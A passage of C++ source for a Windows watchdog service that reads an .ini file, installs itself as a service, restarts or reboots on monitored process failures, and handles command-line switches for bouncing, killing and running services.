			WriteLog(pLogFile, szTmp);
		}
		else
		{
			sprintf(szTmp, "Service %s installed\n", pName);
			WriteLog(pLogFile, szTmp);
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);
	}	
}



void WorkerProc(void* pParam)
{
	ProcessQuerytor loQuerytor;

	if (!gbInit)
	{
		InitProcess(loQuerytor);

		gbInit = TRUE;

		g_OEventStartProcess.SetEvent();

	}

	char szTmp[c_nMaxSize] = "";

	int nInterval = ::GetPrivateProfileInt("Settings", "CheckProcess", 160, pInitFile);

	while (nInterval>0 && nProcCount>0)
	{
		if (g_bServiceShutDown)
		{
			return;
		}

		for (int i = 0; i < nProcCount; i++)
		{
			if (g_bServiceShutDown)
			{
				return;
			}

			if (IsShouldKillProcess(i,loQuerytor))
			{

				EndProcess(i,loQuerytor);

			}

			BOOL ProcessIsRun = IsProcessAlive(i,loQuerytor);

			sprintf(szTmp,"Process%d",i);

			BOOL bRestart = ::GetPrivateProfileInt(szTmp, "Restart", 1, pInitFile);

			BOOL lbReBootComputer = ::GetPrivateProfileInt(szTmp,"Reboot",0,pInitFile);

			if (1 == lbReBootComputer && !ProcessIsRun)
			{
				char szInfo[c_nMaxSize] = "";

				sprintf(szInfo,"File %s is down. begin Reboot Computer.", pProcess[i].szModuleName);

				WriteLog(pLogFile, szInfo);

				BOOL lbOpRet = FALSE;

				try
				{
					lbOpRet = ReBootComputer(loQuerytor);
				}
				catch (...)
				{
					lbOpRet = FALSE;
				}

				sprintf(szInfo,"File %s is down. Computer Reboot Failed.",  pProcess[i].szModuleName);

				WriteLog(pLogFile, szInfo);					

			}else
			{
				if (bRestart && !StartProcess(i,loQuerytor))
				{
					char szLog[c_nMaxSize] = "";
					::sprintf(szLog, "failed to start process %d", i);
					WriteLog(pLogFile, szLog);
				}



			}

			if (g_bServiceShutDown)
			{
				return;
			}

		}

		//OutputDebugString(_T("WorkerProc While \r\n"));

		::Sleep(nInterval*CLOCKS_PER_SEC);
	}


}


////////////////////////////////////////////////////////////////////// 
//
// Standard C Main
//


int main(int argc, char *argv[])
{
	//MessageBox(NULL,"test","test",MB_OK);
	// initialize global critical section
	::InitializeCriticalSection(&myCS);
	// initialize variables for .exe, .ini, and .log file names
	char pModuleFile[c_nMaxSize] = "";
	DWORD dwSize = ::GetModuleFileName(NULL,pModuleFile,c_nMaxSize);
#ifdef _DEBUG
	//Sleep(10000);
#endif // _DEBUG
	pModuleFile[dwSize] = '\0';
	if(dwSize>4&&pModuleFile[dwSize-4]=='.')
	{
		sprintf(pExeFile,"%s",pModuleFile);
		pModuleFile[dwSize-4] = '\0';
		sprintf(pInitFile,"%s.ini",pModuleFile);
		sprintf(pLogFile,"%s.log",pModuleFile);
	}
	else
	{
		sprintf(pExeFile,"%s",argv[0]);
		sprintf(pInitFile,"%s","BHWatchDogService.ini");
		sprintf(pLogFile,"%s","BHWatchDogService.log");
	}

	// read service name from .ini file
	DWORD ldwRet = ::GetPrivateProfileString("Settings","ServiceName","BHService",pServiceName,c_nMaxSize,pInitFile);



	int lnBackServerPort = ::GetPrivateProfileInt("Settings","ServerPort",6211,pInitFile);	
	RemoteOperator::DetectAvailablePort(lnBackServerPort);

	CString lstrServerPort;
	lstrServerPort.Format(_T("%d"),lnBackServerPort);
	::WritePrivateProfileString("Settings","ServerPort",lstrServerPort,pInitFile);

	int lnUseDeepSearch = ::GetPrivateProfileInt("Settings","UseDeepSearch",1,pInitFile);
	lstrServerPort.Format(_T("%d"),lnUseDeepSearch);
	::WritePrivateProfileString("Settings","UseDeepSearch",lstrServerPort,pInitFile);
	InterlockedExchange(&g_lUseDeepSearch,lnUseDeepSearch);


	RemoteOperator loRemoteServer;
	loRemoteServer.Port(lnBackServerPort);
	loRemoteServer.StartTraceServer();

	DWORD ldwLastError = ::GetLastError();

	// read program count from .ini file
	char pCount[c_nMaxSize+1];
	::GetPrivateProfileString("Settings","ProcCount","",pCount,c_nMaxSize,pInitFile);
	nProcCount = atoi(pCount);
	BOOL lbHasOnlyStartProcess = FALSE;
	//判断是否单实例

	BOOL lbSingleInstance = ::GetPrivateProfileInt("Settings","SingleInstance",1,pInitFile);

	if (lbSingleInstance)
	{
		g_SingleInstanceHandle = CreateMutex(NULL,FALSE,pServiceName);

		DWORD ldwError = GetLastError();

		if (ldwError ==ERROR_ALREADY_EXISTS ||  g_SingleInstanceHandle == NULL) 
		{
			if (g_SingleInstanceHandle != NULL)
			{
				::ReleaseMutex(g_SingleInstanceHandle);
			}

			char pTemp[121];

			sprintf(pTemp, "only one instance permitted, exiting ...\n");

			WriteLog(pLogFile, pTemp);

			return -1;
		}
	}

	// initialize process information array
	if(nProcCount>0)
	{
		pProcess = new MyProcess[nProcCount+20];
		::memset(pProcess, 0, nProcCount*sizeof(MyProcess));
		for (int i=0;i<nProcCount;i++)
		{
			pProcess[i].m_nProcInfoCount = c_nMaxSize;
		}
	}

	BOOL lbStartProcessFromConsole = FALSE;

	// uninstall service if switch is "-u"
	if(argc==2&&_stricmp("-u",argv[1])==0)
	{
		UnInstall(pServiceName);
	}

	// install service if switch is "-i"
	else if(argc==2&&_stricmp("-i",argv[1])==0)
	{			
		Install(pExeFile, pServiceName);
	}
	// bounce service if switch is "-b"
	else if(argc==2&&_stricmp("-b",argv[1])==0)
	{			
		KillService(pServiceName);
		RunService(pServiceName,0,NULL);
	}
	// bounce a specifc program if the index is supplied
	else if(argc==3&&_stricmp("-b",argv[1])==0)
	{
		int nIndex = atoi(argv[2]);
		if(BounceProcess(pServiceName, nIndex))
		{
			char pTemp[121];
			sprintf(pTemp, "Bounced process %d.\n", nIndex);
			WriteLog(pLogFile, pTemp);
		}
		else
		{
			char pTemp[121];
			sprintf(pTemp, "Failed to bounce process %d.\n", nIndex);
			WriteLog(pLogFile, pTemp);
		}
	}
	// kill a service with given name
	else if(argc==3&&_stricmp("-k",argv[1])==0)
	{
		if(KillService(argv[2]))
		{
			char pTemp[121];
			sprintf(pTemp, "Killed service %s.\n", argv[2]);
			WriteLog(pLogFile, pTemp);
		}
		else
		{
			char pTemp[121];
			sprintf(pTemp, "Failed to kill service %s.\n", argv[2]);
			WriteLog(pLogFile, pTemp);
		}
	}
	// run a service with given name
	else if (argc>=3&&_stricmp("-r",argv[1])==0)
	{
		if(RunService(argv[2], argc>3?(argc-3):0,argc>3?(&(argv[3])):NULL))
		{
			char pTemp[121];
			sprintf(pTemp, "Ran service %s.\n", argv[2]);
			WriteLog(pLogFile, pTemp);
		}
		else
		{
			char pTemp[121];
			sprintf(pTemp, "Failed to run service %s.\n", argv[2]);
			WriteLog(pLogFile, pTemp);
		}
	}
	// check the version of the program
	else if (argc==2 && _stricmp("-v", argv[1])==0)
	{
		printf("Program: XYNTService\nCurrent Version: %d.%d\n", c_iMainVer, c_iSubVer);
	}
	//assume user is starting this service 
	else
	{		
		// start a worker thread to check for dead programs (and restart if necessary)
		CString lstrStart;
		lstrStart.Format(_T("%d"),::GetCurrentProcessId());
		CString lstrPidFileName = "pid.txt";
		WriteLog(lstrPidFileName.GetBuffer(0),lstrStart.GetBuffer(0));

		g_hCheckThread = (HANDLE)_beginthread(WorkerProc, 0, NULL);

		if(g_hCheckThread == (HANDLE)-1)
		{
			long nError = GetLastError();
			char pTemp[121];
			sprintf(pTemp, "_beginthread failed, error code = %d\n", nError);
			WriteLog(pLogFile, pTemp);

		}else
		{
			if (argc > 1)
			{
				CString lstrArgs = argv[1];

				//命令行启动，非服务启动使用了 -ns参数
				if (lstrArgs.Find(_T("-ns"))>=0)
				{
					WaitForSingleObject(g_hCheckThread,INFINITE);		
				}
			}else
			{
				//命令行启动，非服务启动没有使用-ns参数
				lbHasOnlyStartProcess = TRUE;				
			}
		}

		if(argc==2&&_stricmp("-t",argv[1])==0)
		{			
			lbStartProcessFromConsole = TRUE;
		}

		if(!lbStartProcessFromConsole)
		{
			// pass dispatch table to service controller
			if(!StartServiceCtrlDispatcher(DispatchTable))
			{
				long nError = GetLastError();
				char pTemp[121];
				sprintf(pTemp, "StartServiceCtrlDispatcher failed, error code = %d\n", nError);
				WriteLog(pLogFile, pTemp);

				if (lbHasOnlyStartProcess)
				{
					//WaitForSingleObject(g_OEventStartProcess.m_hObject,INFINITE);
				}
			}
		}else
		{
			WaitForSingleObject(g_hCheckThread,INFINITE);
		}

		// you don't get here in service mode unless the service is shutdown


	}
	// clean up
	if (pProcess)
	{
		delete [] pProcess;
		pProcess = NULL;
	}
	::DeleteCriticalSection(&myCS);



	if (g_SingleInstanceHandle != NULL)
	{
		try
		{
			CloseHandle(g_SingleInstanceHandle);

		}catch(...)
		{

		}
	}


	return 0;
}
